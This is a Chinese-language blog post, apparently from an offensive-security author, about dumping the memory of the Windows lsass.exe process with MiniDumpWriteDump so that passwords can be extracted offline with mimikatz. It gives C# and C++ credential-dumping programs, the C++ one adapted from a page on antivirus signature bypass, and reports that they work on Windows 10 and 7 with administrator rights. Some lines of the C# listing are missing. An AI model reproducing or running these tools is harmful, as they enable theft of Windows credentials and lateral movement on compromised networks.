# 利用MiniDumpWriteDump 转储 lsass

## MiniDumpWriteDump

有些环境下可能无法上传或者利用mimikatz，可以转储lsass，然后本地离线用mimikatz读取密码。  
用来将指定进程的内存转储保存为文件，就是生成的文件有点大。  
函数：

```
1.  `BOOL MiniDumpWriteDump(`
    
2.  `  HANDLE                            hProcess,`
    
3.  `  DWORD                             ProcessId,`
    
4.  `  HANDLE                            hFile,`
    
5.  `  MINIDUMP_TYPE                     DumpType,`
    
6.  `  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,`
    
7.  `  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,`
    
8.  `  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam`
    
9.  `);`
    
```

具体可以看文档：https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump

直接贴代码，直接编译就能用。但是有点问题。

```
1.  `using System;`
    
2.  `using System.Runtime.InteropServices;`
    
3.  `using System.Diagnostics;`
    
4.  `using System.IO;`
    
5.  
    
6.  
    
7.  `namespace LsassDump`
    
8.  `{`
    
9.  `    class Program`
    
10.  `    {`
     
11.  `        static void Main(string[] args)`
     
12.  `        {`
     
13.  `            Console.WriteLine("[+]Start Dump.........");`
     
14.  `            MiniDump.TryDump("MiniDmp.dmp", MiniDump.MiniDumpType.WithFullMemory);`
     
15.  `            Console.WriteLine("[+]OK");`
     
16.  `            Console.ReadKey();`
     
17.  `        }`
     
18.  `    }`
     
19.  
     
20.  
     
21.  `    public static class MiniDump`
     
22.  `    {`
     
23.  `        /*`
     
24.  `         * 导入DbgHelp.dll`
     
25.  `         */`
     
26.

28.  `            EntryPoint = "MiniDumpWriteDump",`

30.  `            CharSet = CharSet.Unicode,`
     
31.  `            ExactSpelling = true,`
     
32.  `            SetLastError = true)]`
     
33.  `        private static extern bool MiniDumpWriteDump(`
     
34.  `                                    IntPtr hProcess,`
     
35.  `                                    Int32 processId,`
     
36.  `                                    IntPtr fileHandle,`
     
37.  `                                    MiniDumpType dumpType,`
     
38.  `                                    IntPtr expParam,`
     
39.  `                                    IntPtr userStreamParam,`
     
40.  `                                    IntPtr callbackParam);`
     
41.  
     
42.  
     
43.  `        /*`
     
44.  `         * 封装的一个函数`
     
45.  `         */`
     
46.  `        public static Boolean TryDump(String dmpPath, MiniDumpType dmpType)`
     
47.  `        {`
     
48.  
     
49.  `            //使用文件流来创建 .dmp文件`
     
50.  `            using (FileStream stream = new FileStream(dmpPath, FileMode.Create))`
     
51.  `            {`
     
52.  `                //取得进程信息`

55.  
     
56.  
     
57.  `                //调用Win32API`
     
58.  `                Boolean res = MiniDumpWriteDump(`
     
59.  `                                    process[0].Handle,`
     
60.  `                                    process[0].Id,`
     
61.  `                                    stream.SafeFileHandle.DangerousGetHandle(),`
     
62.  `                                    dmpType,`
     
63.  `                                    IntPtr.Zero,`
     
64.  `                                    IntPtr.Zero,`
     
65.  `                                    IntPtr.Zero);`
     
66.  
     
67.  `                //清空 stream`
     
68.  `                stream.Flush();`
     
69.  `                stream.Close();`
     
70.  
     
71.  `                return res;   `
     
72.  `            }`
     
73.  `        }`
     
74.  
     
75.  `        public enum MiniDumpType`
     
76.  `        {`
     
77.  `            None = 0x00010000,`
     
78.  `            Normal = 0x00000000,`
     
79.  `            WithDataSegs = 0x00000001,`
     
80.  `            WithFullMemory = 0x00000002,`
     
81.  `            WithHandleData = 0x00000004,`
     
82.  `            FilterMemory = 0x00000008,`
     
83.  `            ScanMemory = 0x00000010,`
     
84.  `            WithUnloadedModules = 0x00000020,`
     
85.  `            WithIndirectlyReferencedMemory = 0x00000040,`
     
86.  `            FilterModulePaths = 0x00000080,`
     
87.  `            WithProcessThreadData = 0x00000100,`

89.  `            WithoutOptionalData = 0x00000400,`
     
90.  `            WithFullMemoryInfo = 0x00000800,`
     
91.  `            WithThreadInfo = 0x00001000,`

93.  `        }`
     
94.  `    }`
```

## C++版本  

参考了这里的代码：https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass

```
1.  `#include "stdafx.h"`
    
2.  `#include <windows.h>`
    
3.  `#include <DbgHelp.h>`
    
4.  `#include <iostream>`
    
5.  `#include <TlHelp32.h>`
    
6.  `using namespace std;`
    
7.  
    
8.  `int main() {`
    
9.  `    DWORD lsassPID = 0;`
    
10.  `    HANDLE lsassHandle = NULL; `
     
11.  `    HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);`
     
12.  `    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);`
     
13.  `    PROCESSENTRY32 processEntry = {};`
     
14.  `    processEntry.dwSize = sizeof(PROCESSENTRY32);`
     
15.  `    LPCWSTR processName = L"";`
     
16.  
     
17.  `    if (Process32First(snapshot, &processEntry)) {`
     
18.  `        while (_wcsicmp(processName, L"lsass.exe") != 0) {`
     
19.  `            Process32Next(snapshot, &processEntry);`
     
20.  `            processName = processEntry.szExeFile;`
     
21.  `            lsassPID = processEntry.th32ProcessID;`
     
22.  `        }`
     
23.  `        wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;`
     
24.  `    }`
     
25.  
     
26.  `    lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);`
     
27.  `    BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);`
     
28.  
     
29.  `    if (isDumped) {`
     
30.  `        cout << "[+] lsass dumped successfully!" << endl;`
     
31.  `    }`
     
32.  
     
33.  `    return 0;`
     
34.  `}`
     
```

编译出来。  
在win10没有问题，在win7下测试也没有问题，管理员权限运行能正常导出。
